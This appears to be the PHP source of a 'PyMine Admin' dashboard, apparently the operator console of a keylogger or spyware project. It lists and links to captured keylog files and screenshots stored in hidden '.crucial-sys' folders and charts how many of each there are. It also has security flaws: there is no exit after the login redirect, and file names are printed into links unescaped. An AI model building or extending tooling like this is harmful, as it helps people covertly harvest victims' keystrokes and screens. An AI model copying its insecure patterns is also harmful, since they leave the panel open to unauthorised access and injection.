<?php
   session_start();
   if($_SESSION['login_user']){
      echo "Welcome user " . $_SESSION["login_user"];
   }else{
      header("location:login_page.html");
   }
?>


<!DOCTYPE html>

<html lang="en">

<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="../documentation/img/apple-icon.png">
  <link rel="icon" type="image/png" href="../documentation/img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>
    Syslog Server
  </title>
  <meta content='width=device-width, initial-scale=1.0, shrink-to-fit=no' name='viewport' />
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
  <!-- CSS Files -->
  <link href="../documentation/css/material-dashboard.css?v=2.1.2" rel="stylesheet" />
  <!-- CSS Just for demo purpose, don't include it in your project -->
  <link href="../documentation/demo/demo.css" rel="stylesheet" />
    <?php
        $scFileDir = "/usr/share/fileupload/home/$uname/.crucial-sys/screenshots";
        $filecount = 0;
        $files = scandir($scFileDir);
        $filecount = count($files);

        $txtFileDir = "/usr/share/fileupload/home/$uname/.crucial-sys/keylogs";
        $filecount2 = 0;
        $files2 = scandir($txtFileDir);
        $filecount2 = count($files2)-2;

        $sumFileCount = $filecount + $filecount2;
        $percentFileCount1 = ($filecount / $sumFileCount) * 100;
        $percentFileCount2 = ($filecount2 / $sumFileCount) * 100;

        $dataPoints = array(
            array("label"=>"Keylog Files", "y"=>$percentFileCount2),
            array("label"=>"Screenshots", "y"=>$percentFileCount1),
        )
    ?>
    <script>
        window.onload = function() {


        var chart = new CanvasJS.Chart("chartContainer", {
    	animationEnabled: true,
    	title: {
	    	text: ""
    	},
    	subtitles: [{
    		text: ""
    	}],
	    data: [{
	    	type: "pie",
	    	yValueFormatString: "#,##0.00\"%\"",
	    	indexLabel: "{label} ({y})",
	    	dataPoints: <?php echo json_encode($dataPoints, JSON_NUMERIC_CHECK); ?>
	    }]
    });
    chart.render();

    }
    </script>

</head>

<body class="">
<h2><a href = "logout.php">Sign Out</a></h2>
 <div class="wrapper">
        <div class="sidebar" data-color="red">
            <!--
        Tip 1: You can change the color of the sidebar using: data-color="purple | blue | green | orange | red"

        Tip 2: you can also add an image using data-image tag
    -->
            <div class="sidebar-wrapper">
                <div class="logo">
                    <a href="https://youtu.be/oHg5SJYRHA0" class="simple-text">
                        PyMine Admin
                    </a>
                </div>
                <ul class="nav">
                    <li class="nav-item active">
                        <a class="nav-link" href="dashboard.php">
                            <i class="nc-icon nc-chart-pie-35"></i>
                            <p>Dashboard</p>
                        </a>
                    </li>
                    <li>
                        <a class="nav-link" href="./citations.html">
                            <i class="nc-icon nc-paper-2"></i>
                            <p>Citations</p>
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="main-panel">
            <!-- Navbar -->
            <nav class="navbar navbar-expand-lg " color-on-scroll="500">
                <div class="container-fluid">
                    <a class="navbar-brand" href="#pablo">User Files</a>
                    <button href="" class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-bar burger-lines"></span>
                        <span class="navbar-toggler-bar burger-lines"></span>
                        <span class="navbar-toggler-bar burger-lines"></span>
                    </button>
                    <div class="collapse navbar-collapse justify-content-end" id="navigation">
                        <ul class="navbar-nav ml-auto">
                            <li class="nav-item">
                                <a class="nav-link" href="#pablo">
                                    <span class="no-icon">Log out</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>
            <!-- End Navbar -->
<div class="content" style="background-color:#DCDCDC">
                <div class="container-fluid" style="background-color:#DCDCDC">
                <div class="row">
                <div class="col-md-12">
                            <div class="card">
                                <div class="card-header">
                                    <h4 class="card-title">File Ratio</h4>
                                    <p class="card-category">PyMine</p>
                                </div>
                                <div class="card-body">
                                    <div id="chartContainer" style="height: 370px;"></div>
                                </div>
                            </div>
                        </div>

                </div>
                <br>
<div class="row">
    <div class="col-md-6">
        <div class="card  card-tasks">
            <div class="card-header ">
                <h4 class="card-title">Screenshots</h4>
            </div>
            <div class="card-body ">
                <?php
                    echo "Here are the files for our screenshots<br><br>";
                    $path = "/usr/share/fileupload/home/$uname/.crucial-sys/screenshots";
                    $dh = opendir($path);
                    $i=1;
                    while (($file = readdir($dh)) !== false) {
                        if($file != "." && $file != ".." && $file != "sample.php" && $file != ".htaccess" && $file != "error_log" && $file != "cgi-bin") {
                        echo "<a href='/userdata/home/" . $uname . "/.crucial-sys/screenshots/$file'>$file</a><br /><br />";
                        $i++;
                            }
                    }
                    closedir($dh);
                ?>
            </div>
            <div class="card-footer ">
                <hr>
                <div class="stats">
                    <i class="fa fa-check"></i> Data has been update!
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-6">
        <div class="card  card-tasks">
            <div class="card-header ">
                <h4 class="card-title">Keylog Files</h4>
            </div>
            <div class="card-body ">
                <?php
                    echo "Here are the files for our keylog files<br><br>";
                    $path = "/usr/share/fileupload/home/$uname/.crucial-sys/keylogs";
                    $dh = opendir($path);
                    $i=1;
                    while (($file = readdir($dh)) !== false) {
                        if($file != "." && $file != ".." && $file != "sample.php" && $file != ".htaccess" && $file != "error_log" && $file != "cgi-bin") {
                        echo "<a href='/userdata/home/" . $uname . "/.crucial-sys/keylogs/$file'>$file</a><br /><br />";
                        $i++;
                            }
                    }
                    closedir($dh);
                ?>
            </div>
            <div class="card-footer ">
                <hr>
                <div class="stats">
                    <i class="fa fa-check"></i> Data has been update!
                </div>
            </div>
        </div>
       </div>
      </div>
    </div>
</div>
<footer class="footer">
                <div class="container-fluid">
                    <nav>
                        <p class="copyright text-center">
                            ©
                            <script>
                                document.write(new Date().getFullYear())

                            </script>
                            <a href="">PyMine</a>, The Future is here! <3 </p> </nav> </div> </footer>
</div>
</div>
<script src="https://canvasjs.com/assets/script/canvasjs.min.js"></script>
 <!--   Core JS Files   -->
  <script src="../documentation/js/core/jquery.min.js"></script>
  <script src="../documentation/js/core/popper.min.js"></script>
  <script src="../documentation/js/core/bootstrap-material-design.min.js"></script>
  <script src="../documentation/js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!-- Plugin for the momentJs  -->
  <script src="../documentation/js/plugins/moment.min.js"></script>
  <!--  Plugin for Sweet Alert -->
  <script src="../documentation/js/plugins/sweetalert2.js"></script>
  <!-- Forms Validations Plugin -->
  <script src="../documentation/js/plugins/jquery.validate.min.js"></script>
  <!-- Plugin for the Wizard, full documentation here: https://github.com/VinceG/twitter-bootstrap-wizard -->
  <script src="../documentation/js/plugins/jquery.bootstrap-wizard.js"></script>
  <!--	Plugin for Select, full documentation here: http://silviomoreto.github.io/bootstrap-select -->
  <script src="../documentation/js/plugins/bootstrap-selectpicker.js"></script>
  <!--  Plugin for the DateTimePicker, full documentation here: https://eonasdan.github.io/bootstrap-datetimepicker/ -->
  <script src="../documentation/js/plugins/bootstrap-datetimepicker.min.js"></script>
  <!--  DataTables.net Plugin, full documentation here: https://datatables.net/  -->
  <script src="../documentation/js/plugins/jquery.dataTables.min.js"></script>
  <!--	Plugin for Tags, full documentation here: https://github.com/bootstrap-tagsinput/bootstrap-tagsinputs  -->
  <script src="../documentation/js/plugins/bootstrap-tagsinput.js"></script>
  <!-- Plugin for Fileupload, full documentation here: http://www.jasny.net/bootstrap/javascript/#fileinput -->
  <script src="../documentation/js/plugins/jasny-bootstrap.min.js"></script>
  <!--  Full Calendar Plugin, full documentation here: https://github.com/fullcalendar/fullcalendar    -->
  <script src="../documentation /js/plugins/fullcalendar.min.js"></script>
  <!-- Vector Map plugin, full documentation here: http://jvectormap.com/documentation/ -->
  <script src="../documentation/js/plugins/jquery-jvectormap.js"></script>
  <!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
  <script src="../documentation/js/plugins/nouislider.min.js"></script>
  <!-- Include a polyfill for ES6 Promises (optional) for IE11, UC Browser and Android browser support SweetAlert -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/core-js/2.4.1/core.js"></script>
  <!-- Library for adding dinamically elements -->
  <script src="../documentation/js/plugins/arrive.min.js"></script>
  <!--  Google Maps Plugin    -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chartist JS -->
  <script src="../documentation/js/plugins/chartist.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="../documentation/js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="../documentation/js/material-dashboard.js?v=2.1.2" type="text/javascript"></script>
  <!-- Material Dashboard DEMO methods, don't include it in your project! -->
  <script src="../documentation/demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      $().ready(function() {
        $sidebar = $('.sidebar');

        $sidebar_img_container = $sidebar.find('.sidebar-background');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');

        window_width = $(window).width();

        fixed_plugin_open = $('.sidebar .sidebar-wrapper .nav li.active a p').html();

        if (window_width > 767 && fixed_plugin_open == 'Dashboard') {
          if ($('.fixed-plugin .dropdown').hasClass('show-dropdown')) {
            $('.fixed-plugin .dropdown').addClass('open');
          }

        }

        $('.fixed-plugin a').click(function(event) {
          // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .active-color span').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-color', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data-color', new_color);
          }
        });

        $('.fixed-plugin .background-color .badge').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('background-color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-background-color', new_color);
          }
        });

        $('.fixed-plugin .img-holder').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).parent('li').siblings().removeClass('active');
          $(this).parent('li').addClass('active');


          var new_image = $(this).find("img").attr('src');

          if ($sidebar_img_container.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            $sidebar_img_container.fadeOut('fast', function() {
              $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
              $sidebar_img_container.fadeIn('fast');
            });
          }

          if ($full_page_background.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $full_page_background.fadeOut('fast', function() {
              $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
              $full_page_background.fadeIn('fast');
            });
          }

          if ($('.switch-sidebar-image input:checked').length == 0) {
            var new_image = $('.fixed-plugin li.active .img-holder').find("img").attr('src');
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
            $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.css('background-image', 'url("' + new_image + '")');
          }
        });

        $('.switch-sidebar-image input').change(function() {
          $full_page_background = $('.full-page-background');

          $input = $(this);

          if ($input.is(':checked')) {
            if ($sidebar_img_container.length != 0) {
              $sidebar_img_container.fadeIn('fast');
              $sidebar.attr('data-image', '#');
            }

            if ($full_page_background.length != 0) {
              $full_page_background.fadeIn('fast');
              $full_page.attr('data-image', '#');
            }

            background_image = true;
          } else {
            if ($sidebar_img_container.length != 0) {
              $sidebar.removeAttr('data-image');
              $sidebar_img_container.fadeOut('fast');
            }

            if ($full_page_background.length != 0) {
              $full_page.removeAttr('data-image', '#');
              $full_page_background.fadeOut('fast');
            }

            background_image = false;
          }
        });

        $('.switch-sidebar-mini input').change(function() {
          $body = $('body');

          $input = $(this);

          if (md.misc.sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            md.misc.sidebar_mini_active = false;

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar();

          } else {

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar('destroy');

            setTimeout(function() {
              $('body').addClass('sidebar-mini');

              md.misc.sidebar_mini_active = true;
            }, 300);
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);

        });
      });
    });
  </script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/js/demos.js
      md.initDashboardPageCharts();

    });
  </script>
</body>
